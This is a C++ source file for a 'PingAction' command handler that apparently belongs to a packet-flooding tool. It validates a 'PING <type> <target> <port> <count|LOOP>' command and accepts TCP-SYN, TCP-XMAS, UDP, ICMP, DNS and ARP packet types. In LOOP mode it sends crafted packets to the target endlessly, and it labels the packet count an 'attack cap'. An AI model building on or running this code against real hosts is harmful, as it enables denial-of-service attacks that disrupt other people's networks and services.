#include "PingAction.hpp"

bool isValidAlgorithm(const char* cString) {
    if (GeneralUtils::cStrAreEqual(cString, "TCP-SYN")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "TCP-ACK")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "TCP-SYN-ACK")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "TCP-XMAS")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "UDP")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "ICMP-REQ")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "ICMP-REP")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "DNS")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "ARP-REQ")) {
        return true;
    } /*else if (GeneralUtils::cStrAreEqual(cString, "HTTP-GET")) {
         return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "HTTP-POST")) {
        return true;
    } */  // to be completed!
    return false;
}

PingAction::PingAction(std::vector<std::string> actionParams) 
    : actionParams(actionParams) {
    this->checkParams();
}


ActionType PingAction::getActionType() {
    return ActionType::PING;
}


void PingAction::execute() {
    if (!isValid) {
        printf("isValid DID NOT PASS!\n");
        return;
    }
    const char* targetUri = actionParams[TARGET_URI_IDX].c_str();
    const int targetPort = atoi(actionParams[TARGET_PORT_IDX].c_str());
    const char* algo = actionParams[ALGO_IDX].c_str();

    // send info to PacketLauncher
    PacketLauncher packetLauncher(targetUri, targetPort, algo);
    packetLauncher.craftPacket();

    if (GeneralUtils::cStrAreEqual(actionParams[ATTACK_CAP_IDX].c_str(), "LOOP")) {
        while (true) { // ping until external forces act
            packetLauncher.launchPacket();
        }
        return;
    }

    const int nPackets = atoi(actionParams[ATTACK_CAP_IDX].c_str());

    for (int i = 0; i < nPackets; i++) {
        packetLauncher.launchPacket();
    }


    printf("isValid passed!\n");
}


/*
    PING Command Syntax:
        PING <PROTOCOL/PING_TYPE> <TARGET_URI> <TARGET_PORT> <N-PACKETS|LOOP>
*/
void PingAction::checkParams() {
    if (actionParams.size() - 3 != PARAM_COUNT) {
        isValid = false;
        return;
    }

    if (!GeneralUtils::cStrAreEqual(actionParams[COMMAND_TYPE_IDX].c_str(), "PING")) {
        isValid = false;
        return;
    }

    if(!isValidAlgorithm(actionParams[ALGO_IDX].c_str())) {
        isValid = false;
        return;
    }

    if (!GeneralUtils::isNumber(actionParams[TARGET_PORT_IDX].c_str())) {
        isValid = false;
        return;
    }

    if (!GeneralUtils::cStrAreEqual(actionParams[ATTACK_CAP_IDX].c_str(), "LOOP") && !GeneralUtils::isNumber(actionParams[ATTACK_CAP_IDX].c_str())) {
        isValid = false;
        return;
    }

    isValid = true;
}
